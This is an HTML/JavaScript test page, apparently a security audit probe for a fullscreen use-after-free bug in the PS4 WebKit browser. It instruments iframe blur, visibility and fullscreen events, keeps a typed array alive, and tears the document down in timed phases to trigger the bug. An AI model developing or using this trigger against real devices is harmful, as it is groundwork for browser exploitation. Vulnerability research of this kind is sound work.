<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit Fullscreen UAF â€“ ABC Audit</title>
<style>
body { font-family: monospace; }
pre { background:#eee; padding:10px; height:300px; overflow:auto; }
iframe { width:100%; height:220px; border:1px solid black; }
</style>
</head>
<body>

<h2>PARENT LOGGER</h2>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";

log("[PARENT] Loaded");

const iframe = document.createElement("iframe");
document.body.appendChild(iframe);

const doc = iframe.contentDocument;
doc.open();
doc.write(`
<!DOCTYPE html>
<html>
<body>
<h3>IFRAME CONTEXT</h3>
<button id="start">START</button>
<pre id="ilog"></pre>

<script>
const ilogEl = document.getElementById("ilog");
let counts = {
  blur:0,
  visibility:0,
  pagehide:0,
  fullscreen:0
};

const ilog = m => {
  ilogEl.textContent += m + "\\n";
  parent.postMessage(m, "*");
};

// ===== GLOBAL OBJECT (TEST B) =====
let victimArray = null;

function reportCounts(stage) {
  ilog("[COUNTS@" + stage + "] blur=" + counts.blur +
       " visibility=" + counts.visibility +
       " pagehide=" + counts.pagehide +
       " fullscreen=" + counts.fullscreen);
}

// ===== EVENT INSTRUMENTATION (TEST A) =====
window.onblur = () => {
  counts.blur++;
  ilog("[EVENT] onblur #" + counts.blur);
};

document.addEventListener("visibilitychange", () => {
  counts.visibility++;
  ilog("[EVENT] visibilitychange (" + document.visibilityState + ")");
});

window.onpagehide = () => {
  counts.pagehide++;
  ilog("[EVENT] pagehide");
};

document.addEventListener("fullscreenchange", () => {
  counts.fullscreen++;
  ilog("[EVENT] fullscreenchange");
});

// ===== START BUTTON =====
document.getElementById("start").onclick = () => {
  ilog("[START] clicked");

  // ===== TEST B: Float64Array lifetime =====
  victimArray = new Float64Array(8);
  for (let i=0;i<victimArray.length;i++) victimArray[i]=i+1;
  ilog("[TEST B] Float64Array allocated (kept alive)");

  // Request fullscreen INSIDE iframe
  const el = document.documentElement;
  if (el.webkitRequestFullscreen) {
    el.webkitRequestFullscreen();
    ilog("[STATE] fullscreen requested");
  }

  // ===== BLUR TRIGGER LOGIC =====
  window.onblur = () => {
    counts.blur++;
    ilog("[EVENT] onblur #" + counts.blur);
    reportCounts("BLUR");

    // ===== TEST C: PHASED TEARDOWN =====
    setTimeout(() => {
      ilog("[TEST C] Phase 1: remove handlers");
      window.onblur = null;
      reportCounts("PHASE1");

      setTimeout(() => {
        ilog("[TEST C] Phase 2: exit fullscreen");
        try {
          if (document.exitFullscreen) document.exitFullscreen();
          else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
        } catch(e){}
        reportCounts("PHASE2");

        setTimeout(() => {
          ilog("[TEST C] Phase 3: document.write teardown");
          reportCounts("BEFORE_WRITE");

          document.open();
          document.write("<html><body>teardown</body></html>");
          document.close();
        }, 500);

      }, 500);
    }, 200);
  };
};
<\/script>
</body>
</html>
`);
doc.close();

window.addEventListener("message", e => {
  log("[MSG] " + e.data);
});
</script>

</body>
</html>
